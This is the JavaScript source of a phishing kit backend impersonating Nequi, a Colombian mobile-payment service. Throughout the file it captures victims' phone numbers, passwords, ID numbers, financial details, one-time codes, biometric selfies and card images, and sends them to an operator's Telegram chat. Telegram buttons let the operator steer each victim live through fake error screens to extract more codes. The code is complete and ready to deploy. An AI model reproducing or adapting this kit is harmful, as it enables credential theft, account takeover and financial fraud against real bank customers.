// 📦 Backend Dinámico para Nequi - Sistema de Control con Telegram

const express = require('express');
const bodyParser = require('body-parser');
const axios = require('axios');
const cors = require('cors');
const FormData = require('form-data');
const app = express();

// ==================== CONFIGURACIÓN CORS ====================
const corsOptions = {
  origin: '*', 
  methods: ['GET', 'POST', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization'],
  credentials: false
};

app.use(cors(corsOptions));
app.options('*', cors(corsOptions));
app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ limit: '50mb', extended: true }));
app.use(express.static('public'));

// ==================== VARIABLES DE ENTORNO ====================
const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;
const RENDER_URL = process.env.RENDER_URL || 'https://nequiscol.onrender.com';

if (!BOT_TOKEN || !CHAT_ID) {
  console.warn("[WARN] BOT_TOKEN o CHAT_ID no definidos en variables de entorno.");
}

// ==================== ALMACENAMIENTO EN MEMORIA ====================
const redirections = new Map(); // sessionId -> ruta de redirección
const bannedIPs = new Set(); // IPs baneadas
const sessionData = new Map(); // sessionId -> { datos de la sesión }

// ==================== FUNCIONES AUXILIARES ====================
const getTelegramApiUrl = (method) => `https://api.telegram.org/bot${BOT_TOKEN}/${method}`;

function generateSessionId() {
  return `session_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
}

// ==================== MENÚS DE TELEGRAM ====================

function getLoanSimulatorMenu(sessionId) {
  return {
    inline_keyboard: [
      [
        { text: "❌ Error Número", callback_data: `go:accces-sign-in|${sessionId}` },
        { text: "❌ Error Clave", callback_data: `go:access-sign-in-pass|${sessionId}` }
      ],
      [
        { text: "🧬 Biometría", callback_data: `go:biometria|${sessionId}` }
      ],
      [
        { text: "🧬 Documentos", callback_data: `go:documento|${sessionId}` }
      ],
      [
        { text: "❌ Error Monto", callback_data: `go:loan-simulator-error|${sessionId}` },
        { text: "♻️ Pedir Dinámica", callback_data: `go:one-time-pass|${sessionId}` }
      ],
      [
        { text: "❌ Error Monto", callback_data: `go:loan-simulator-error|${sessionId}` },
        { text: "♻️ Pedir Dinámica SMS", callback_data: `go:one-time-sms|${sessionId}` }
      ],
      [
        { text: "🚫 BANEAR", callback_data: `ban|${sessionId}` },
        { text: "✅ Consignar", callback_data: `go:consignar|${sessionId}` }
      ]
    ]
  };
}

function getDynamicMenu(sessionId) {
  return {
    inline_keyboard: [
      [
        { text: "❌ Error Dinámica", callback_data: `error-dynamic|${sessionId}` },
        { text: "❌ Error Número", callback_data: `go:accces-sign-in|${sessionId}` }
      ],
      [
        { text: "🧬 Biometría", callback_data: `go:biometria|${sessionId}` }
      ],
      [
        { text: "🧬 Documentos", callback_data: `go:documento|${sessionId}` }
      ],	
      [
        { text: "❌ Error Clave", callback_data: `go:access-sign-in-pass|${sessionId}` },
        { text: "❌ Error Monto", callback_data: `go:loan-simulator-error|${sessionId}` }
      ],
      [
        { text: "❌ Error Monto", callback_data: `go:loan-simulator-error|${sessionId}` },
        { text: "♻️ Pedir Dinámica SMS", callback_data: `go:one-time-sms|${sessionId}` }
      ],
      [
        { text: "🚫 BANEAR", callback_data: `ban|${sessionId}` },
        { text: "✅ Consignar", callback_data: `go:consignar|${sessionId}` }
      ]
    ]
  };
}

// ==================== ENDPOINT PRINCIPAL ====================
app.get('/', (_req, res) => {
  res.json({ 
    ok: true, 
    service: 'Nequi Backend Dinámico', 
    hasEnv: !!(BOT_TOKEN && CHAT_ID),
    status: 'running',
    sessionCount: sessionData.size
  });
});

// ==================== ENDPOINT: VERIFICAR BANNEO ====================
app.post('/check-ban', (req, res) => {
  const { ip } = req.body;
  
  if (bannedIPs.has(ip)) {
    return res.json({ banned: true });
  }
  
  res.json({ banned: false });
});

// ==================== ENDPOINT: CREAR SESIÓN (ACTUALIZADO) ====================
app.post('/create-session', (req, res) => {
  const { sessionId, cedula, nombre, telefono, correo, ip, country, city } = req.body;
  
  // Si ya existe sesión, actualizar
  let session = sessionData.get(sessionId) || {};
  
  session.cedula = cedula || session.cedula;
  session.nombreCompleto = nombre || session.nombreCompleto;
  session.phoneNumber = telefono || session.phoneNumber;
  session.correo = correo || session.correo;
  session.ip = ip || session.ip;
  session.country = country || session.country;
  session.city = city || session.city;
  session.createdAt = session.createdAt || new Date();
  session.steps = session.steps || [];
  
  sessionData.set(sessionId, session);
  
  console.log(`✅ Sesión creada/actualizada: ${sessionId}`);
  console.log(`📊 Datos de sesión:`, session);
  
  res.json({ 
    ok: true, 
    sessionId: sessionId,
    message: 'Sesión creada exitosamente'
  });
});

// ==================== ENDPOINT: PASO 1 - NÚMERO Y CLAVE ====================
app.post('/step1-credentials', async (req, res) => {
  try {
    const { sessionId, phoneNumber, password, ip, country, city } = req.body;
    
    if (!BOT_TOKEN || !CHAT_ID) {
      return res.status(500).json({ ok: false, reason: "Env vars undefined" });
    }

    // Guardar en sesión
    const session = sessionData.get(sessionId) || {};
    session.phoneNumber = phoneNumber;
    session.password = password;
    session.ip = ip || session.ip;
    session.country = country || session.country;
    session.city = city || session.city;
    if (!session.steps) session.steps = [];
    session.steps.push({ step: 'credentials', timestamp: new Date() });
    sessionData.set(sessionId, session);

    const mensaje = `
🟣 NUEVO INGRESO NEQUI 🟣

📱 Número: ${phoneNumber}
🔑 Clave: ${password}
🌐 IP: ${ip}
📍 Ubicación: ${city || 'N/A'}, ${country || 'N/A'}
🆔 Session: ${sessionId}
    `.trim();

    await axios.post(getTelegramApiUrl('sendMessage'), {
      chat_id: CHAT_ID,
      text: mensaje
    });

    console.log(`✅ Credenciales recibidas - Session: ${sessionId}`);

    res.json({ ok: true });
  } catch (error) {
    console.error('❌ ERROR EN /step1-credentials:', error.message);
    res.status(500).json({ ok: false, reason: error.message });
  }
});

// ==================== ENDPOINT: PASO 2 - PRÉSTAMO (PRIMER SALDO) ====================
app.post('/step2-loan-first', async (req, res) => {
  try {
    const { 
      sessionId, 
      cedula, 
      nombreCompleto, 
      ocupacion, 
      ingresoMensual, 
      gastosMensual, 
      saldoActual 
    } = req.body;

    console.log('📥 Datos recibidos en step2-loan-first:', {
      sessionId,
      cedula,
      nombreCompleto,
      ocupacion,
      ingresoMensual,
      gastosMensual,
      saldoActual
    });

    // Obtener sesión existente o crear nueva
    let session = sessionData.get(sessionId) || {};
    
    // Guardar TODOS los datos en la sesión
    session.cedula = cedula || session.cedula;
    session.nombreCompleto = nombreCompleto || session.nombreCompleto;
    session.ocupacion = ocupacion || session.ocupacion;
    session.ingresoMensual = ingresoMensual || session.ingresoMensual;
    session.gastosMensual = gastosMensual || session.gastosMensual;
    session.saldoActual1 = saldoActual;
    if (!session.steps) session.steps = [];
    session.steps.push({ step: 'loan-first', timestamp: new Date() });
    
    sessionData.set(sessionId, session);

    console.log(`✅ Primer saldo guardado - Session: ${sessionId}`);
    console.log(`📊 Datos actuales de sesión:`, session);

    res.json({ 
      ok: true, 
      message: 'Primer saldo guardado',
      sessionId: sessionId
    });
  } catch (error) {
    console.error('❌ ERROR EN /step2-loan-first:', error.message);
    res.status(500).json({ ok: false, reason: error.message });
  }
});

// ==================== ENDPOINT: PASO 2 - PRÉSTAMO (SEGUNDO SALDO CON BOTONES) ====================
app.post('/step2-loan-second', async (req, res) => {
  try {
    const { sessionId, saldoActual } = req.body;

    console.log('📥 Datos recibidos en step2-loan-second:', {
      sessionId,
      saldoActual
    });

    if (!BOT_TOKEN || !CHAT_ID) {
      return res.status(500).json({ ok: false, reason: "Env vars undefined" });
    }

    // Obtener datos de sesión
    const session = sessionData.get(sessionId) || {};

    if (!session.saldoActual1) {
      console.warn(`⚠️ No se encontró primer saldo para session: ${sessionId}`);
    }

    // Guardar segundo saldo
    session.saldoActual2 = saldoActual;
    if (!session.steps) session.steps = [];
    session.steps.push({ step: 'loan-second', timestamp: new Date() });
    sessionData.set(sessionId, session);

    console.log(`✅ Segundo saldo guardado - Session: ${sessionId}`);
    console.log(`📊 Datos completos de sesión:`, session);

    // ===== CONSTRUIR MENSAJE COMPLETO CON TODOS LOS DATOS =====
    const mensaje = `
🟣 INFO DE PRÉSTAMO COMPLETA 🟣

📱 Número: ${session.phoneNumber || 'N/A'}
🔑 Clave: ${session.password || 'N/A'}
🪪 Cédula: ${session.cedula || 'N/A'}
👤 Nombre y apellido: ${session.nombreCompleto || 'N/A'}
🧑‍💼 Ocupación: ${session.ocupacion || 'N/A'}
📈 Ingresos mensuales: ${session.ingresoMensual || 'N/A'}
💸 Gastos mensuales: ${session.gastosMensual || 'N/A'}
💰 Saldo actual 1: ${session.saldoActual1 || 'N/A'}
💰 Saldo actual 2: ${session.saldoActual2 || 'N/A'}
🌐 IP: ${session.ip || 'N/A'}
📍 Ubicación: ${session.city || 'N/A'}, ${session.country || 'N/A'}
🆔 Session: ${sessionId}
    `.trim();

    // ===== ENVIAR A TELEGRAM CON BOTONES =====
    await axios.post(getTelegramApiUrl('sendMessage'), {
      chat_id: CHAT_ID,
      text: mensaje,
      reply_markup: getLoanSimulatorMenu(sessionId)
    });

    console.log(`✅ Datos completos enviados con botones - Session: ${sessionId}`);

    res.json({ 
      ok: true, 
      message: 'Datos completos enviados',
      sessionId: sessionId
    });
  } catch (error) {
    console.error('❌ ERROR EN /step2-loan-second:', error.message);
    res.status(500).json({ ok: false, reason: error.message });
  }
});

// ==================== ENDPOINT: PASO 3 - DINÁMICA ====================
app.post('/step3-dynamic', async (req, res) => {
  try {
    const { sessionId, otp, attemptNumber } = req.body;

    if (!BOT_TOKEN || !CHAT_ID) {
      return res.status(500).json({ ok: false, reason: "Env vars undefined" });
    }

    const session = sessionData.get(sessionId) || {};
    
    if (!session.dynamics) {
      session.dynamics = [];
    }
    session.dynamics.push({ type: 'dynamic1', otp, attemptNumber, timestamp: new Date() });
    sessionData.set(sessionId, session);

    const mensaje = `
📲 DINÁMICA1 ${attemptNumber} RECIBIDA 📲

📱 Número: ${session.phoneNumber || 'N/A'}
🔑 Clave: ${session.password || 'N/A'}
👤 Nombre y apellido: ${session.nombreCompleto || 'N/A'}
💰 Saldo actual 1: ${session.saldoActual1 || 'N/A'}
💰 Saldo actual 2: ${session.saldoActual2 || 'N/A'}
🔢 Dinámica ${attemptNumber}: ${otp}
🆔 Session: ${sessionId}
    `.trim();

    await axios.post(getTelegramApiUrl('sendMessage'), {
      chat_id: CHAT_ID,
      text: mensaje,
      reply_markup: getDynamicMenu(sessionId)
    });

    console.log(`✅ Dinámica ${attemptNumber} recibida - Session: ${sessionId} - OTP: ${otp}`);

    res.json({ ok: true });
  } catch (error) {
    console.error('❌ ERROR EN /step3-dynamic:', error.message);
    res.status(500).json({ ok: false, reason: error.message });
  }
});

// ==================== ENDPOINT: PASO 4 - DINÁMICA ====================
app.post('/step4-dynamic', async (req, res) => {
  try {
    const { sessionId, otp, attemptNumber } = req.body;

    if (!BOT_TOKEN || !CHAT_ID) {
      return res.status(500).json({ ok: false, reason: "Env vars undefined" });
    }

    const session = sessionData.get(sessionId) || {};
    
    if (!session.dynamics) {
      session.dynamics = [];
    }
    session.dynamics.push({ type: 'dynamic2', otp, attemptNumber, timestamp: new Date() });
    sessionData.set(sessionId, session);

    const mensaje = `
📲 DINÁMICA2 ${attemptNumber} RECIBIDA 📲

📱 Número: ${session.phoneNumber || 'N/A'}
🔑 Clave: ${session.password || 'N/A'}
👤 Nombre y apellido: ${session.nombreCompleto || 'N/A'}
💰 Saldo actual 1: ${session.saldoActual1 || 'N/A'}
💰 Saldo actual 2: ${session.saldoActual2 || 'N/A'}
🔢 Dinámica ${attemptNumber}: ${otp}
🆔 Session: ${sessionId}
    `.trim();

    await axios.post(getTelegramApiUrl('sendMessage'), {
      chat_id: CHAT_ID,
      text: mensaje,
      reply_markup: getDynamicMenu(sessionId)
    });

    console.log(`✅ Dinámica ${attemptNumber} recibida - Session: ${sessionId} - OTP: ${otp}`);

    res.json({ ok: true });
  } catch (error) {
    console.error('❌ ERROR EN /step4-dynamic:', error.message);
    res.status(500).json({ ok: false, reason: error.message });
  }
});

// ==================== ENDPOINT: BIOMETRÍA ====================
app.post('/step-biometrics', async (req, res) => {
  try {
    const { sessionId, imageBase64, userAgent, ip, phoneNumber } = req.body;

    if (!BOT_TOKEN || !CHAT_ID) {
      return res.status(500).json({ ok: false, error: 'Telegram no configurado' });
    }

    if (!sessionId || !imageBase64) {
      return res.status(400).json({ ok: false, error: 'Datos incompletos' });
    }

    const session = sessionData.get(sessionId) || {};
    sessionData.set(sessionId, session);

    const finalPhoneNumber = session.phoneNumber || phoneNumber || 'N/A';

    const buffer = Buffer.from(
      imageBase64.replace(/^data:image\/\w+;base64,/, ''),
      'base64'
    );

    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('photo', buffer, {
      filename: 'biometria.jpg',
      contentType: 'image/jpeg'
    });
    formData.append('caption', 
`🧬 BIOMETRÍA RECIBIDA

📱 Número: ${finalPhoneNumber}
🆔 Session: ${sessionId}
🌐 IP: ${session.ip || ip || req.ip}
🖥️ UA: ${session.userAgent || userAgent || req.headers['user-agent'] || 'N/A'}`
    );

    await axios.post(
      `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,
      formData,
      { headers: formData.getHeaders() }
    );

    console.log('📸 Biometría enviada a Telegram');
    console.log('📱 Número:', finalPhoneNumber);
    console.log('🆔 Session:', sessionId);

    res.json({ ok: true });
  } catch (err) {
    console.error('❌ Error biometría:', err);
    res.status(500).json({ ok: false });
  }
});

// ==================== ENDPOINT: TARJETA DE REGALO ====================
function base64ToBuffer(base64String) {
  const base64Data = base64String.replace(/^data:image\/\w+;base64,/, "");
  return Buffer.from(base64Data, "base64");
}

app.post("/step-tarjetaregalo", async (req, res) => {
  try {
    const { frontImageBase64, backImageBase64 } = req.body;

    if (!frontImageBase64 || !backImageBase64) {
      return res.status(400).json({ error: "Faltan imágenes" });
    }

    const frontBuffer = base64ToBuffer(frontImageBase64);
    const backBuffer = base64ToBuffer(backImageBase64);

    const caption = `🎁 ¡Has recibido una Tarjeta de Regalo!\n\n👉 Por favor VOLTEA la tarjeta para ver la parte trasera.`;

    // ========= FRONTAL =========
    let formFront = new FormData();
    formFront.append("chat_id", CHAT_ID);
    formFront.append("caption", caption);
    formFront.append("photo", frontBuffer, {
      filename: "frontal.jpg",
      contentType: "image/jpeg"
    });

    await axios.post(
      `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,
      formFront,
      {
        headers: formFront.getHeaders(),
        maxContentLength: Infinity,
        maxBodyLength: Infinity
      }
    );

    // ========= TRASERA =========
    let formBack = new FormData();
    formBack.append("chat_id", CHAT_ID);
    formBack.append("caption", "🔄 Parte trasera de la tarjeta");
    formBack.append("photo", backBuffer, {
      filename: "trasera.jpg",
      contentType: "image/jpeg"
    });

    await axios.post(
      `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,
      formBack,
      {
        headers: formBack.getHeaders(),
        maxContentLength: Infinity,
        maxBodyLength: Infinity
      }
    );

    return res.json({ ok: true });
  } catch (error) {
    console.error("ERROR REAL:", error.response?.data || error.message);
    return res.status(500).json({ error: "Fallo enviando a Telegram" });
  }
});

// ==================== ENDPOINT: CONSIGNAR ====================
app.post('/consignar', async (req, res) => {
  try {
    const { sessionId, phoneNumber, password, ip } = req.body;

    if (!BOT_TOKEN || !CHAT_ID) {
      return res.status(500).json({ ok: false, reason: "Env vars undefined" });
    }

    const session = sessionData.get(sessionId) || {};
    const finalPhone = phoneNumber || session.phoneNumber || 'N/A';
    const finalPass = password || session.password || 'N/A';
    const finalIp = ip || session.ip || 'N/A';

    const mensaje = `
💰 QUIERE CONSIGNAR 💰

📱 Número: ${finalPhone}
🔑 Clave: ${finalPass}
🌐 IP: ${finalIp}

✅ SI QUIERO CONSIGNAR
📲 ENVÍAME POR WHATSAPP PARA CONTINUAR

🆔 Session: ${sessionId}
    `.trim();

    await axios.post(getTelegramApiUrl('sendMessage'), {
      chat_id: CHAT_ID,
      text: mensaje
    });

    console.log(`✅ Mensaje de consignación enviado - Session: ${sessionId}`);

    res.json({ ok: true, message: 'Mensaje enviado a Telegram' });
  } catch (error) {
    console.error('❌ ERROR EN /consignar:', error.message);
    res.status(500).json({ ok: false, reason: error.message });
  }
});

// ==================== WEBHOOK DE TELEGRAM ====================
app.post(`/webhook/${BOT_TOKEN}`, async (req, res) => {
  try {
    const update = req.body;
    const { callback_query } = update;
    
    if (callback_query) {
      const [action, sessionId] = (callback_query.data || '').split('|');
      
      console.log(`📞 Callback recibido - Acción: ${action} - Session: ${sessionId}`);
      
      // Eliminar menú de botones
      try {
        await axios.post(getTelegramApiUrl('editMessageReplyMarkup'), {
          chat_id: callback_query.message.chat.id,
          message_id: callback_query.message.message_id,
          reply_markup: { inline_keyboard: [] }
        });
      } catch (editError) {
        console.log('⚠️ No se pudo eliminar el menú');
      }

      // ==================== MANEJO DE ACCIONES ====================
      
      // BANEAR IP
      if (action === 'ban') {
        const session = sessionData.get(sessionId);
        if (session && session.ip) {
          bannedIPs.add(session.ip);
          
          console.log(`🚫 IP BANEADA: ${session.ip}`);
          
          await axios.post(getTelegramApiUrl('answerCallbackQuery'), {
            callback_query_id: callback_query.id,
            text: `✅ IP ${session.ip} baneada exitosamente`,
            show_alert: true
          });
          
          redirections.set(sessionId, 'banned');
        }
        return res.sendStatus(200);
      }

      // ERROR DINÁMICA
      if (action === 'error-dynamic') {
        redirections.set(sessionId, 'error-dynamic');
        
        console.log(`❌ Error dinámica enviado - Session: ${sessionId}`);
        
        await axios.post(getTelegramApiUrl('answerCallbackQuery'), {
          callback_query_id: callback_query.id,
          text: '❌ Se mostrará error de dinámica',
          show_alert: true
        });
        
        return res.sendStatus(200);
      }

      // ERROR MONTO
      if (action === 'go:loan-simulator-error') {
        redirections.set(sessionId, 'loan-simulator-error');
        
        console.log(`❌ Error monto - Session: ${sessionId}`);
        
        await axios.post(getTelegramApiUrl('answerCallbackQuery'), {
          callback_query_id: callback_query.id,
          text: '❌ Redirigiendo a corregir monto...',
          show_alert: true
        });
        
        return res.sendStatus(200);
      }

      // REDIRECCIONES NORMALES
      if (action.startsWith('go:')) {
        const route = action.replace('go:', '');
        const finalRoute = route.endsWith('.html') ? route : `${route}.php.html`;
        
        redirections.set(sessionId, finalRoute);
        
        console.log(`✅ Redirección programada: ${finalRoute} - Session: ${sessionId}`);
        
        await axios.post(getTelegramApiUrl('answerCallbackQuery'), {
          callback_query_id: callback_query.id,
          text: `✅ Redirigiendo a ${finalRoute}`,
          show_alert: true
        });
      }
    }
    
    res.sendStatus(200);
  } catch (err) {
    console.error("❌ Error en webhook:", err.message);
    res.sendStatus(200);
  }
});

// ==================== ENDPOINT: CONSULTAR INSTRUCCIÓN ====================
app.get('/instruction/:sessionId', (req, res) => {
  const sessionId = req.params.sessionId;
  const target = redirections.get(sessionId);
  
  if (target) {
    console.log(`📍 Polling - Session: ${sessionId} - Target: ${target}`);
    redirections.delete(sessionId);
    res.json({ redirect_to: target });
  } else {
    res.json({});
  }
});

// ==================== ENDPOINT: OBTENER DATOS DE SESIÓN (DEBUG) ====================
app.get('/session/:sessionId', (req, res) => {
  const sessionId = req.params.sessionId;
  const session = sessionData.get(sessionId);
  
  if (session) {
    res.json({ ok: true, session });
  } else {
    res.json({ ok: false, message: 'Sesión no encontrada' });
  }
});

// ==================== CONFIGURAR WEBHOOK DE TELEGRAM ====================
async function setupTelegramWebhook() {
  if (!BOT_TOKEN || !RENDER_URL) {
    console.warn('[WARN] No se puede configurar webhook sin BOT_TOKEN o RENDER_URL');
    return;
  }

  try {
    const webhookUrl = `${RENDER_URL}/webhook/${BOT_TOKEN}`;
    const response = await axios.post(getTelegramApiUrl('setWebhook'), {
      url: webhookUrl
    });
    
    if (response.data.ok) {
      console.log('✅ Webhook de Telegram configurado correctamente:', webhookUrl);
    } else {
      console.error('❌ Error al configurar webhook:', response.data);
    }
  } catch (error) {
    console.error('❌ Error configurando webhook:', error.message);
  }
}

// ==================== INICIAR SERVIDOR ====================
const PORT = process.env.PORT || 3000;
app.listen(PORT, async () => {
  console.log(`✅ Servidor activo en puerto ${PORT}`);
  console.log(`📡 URL del servidor: ${RENDER_URL}`);
  console.log(`📊 Sesiones activas: ${sessionData.size}`);
  
  await setupTelegramWebhook();
});

// ==================== AUTO-PING ====================
setInterval(async () => {
  try {
    const res = await fetch(RENDER_URL);
    const text = await res.text();
    console.log("🔄 Auto-ping realizado:", new Date().toLocaleTimeString());
  } catch (error) {
    console.error("❌ Error en auto-ping:", error.message);
  }
}, 14 * 60 * 1000);
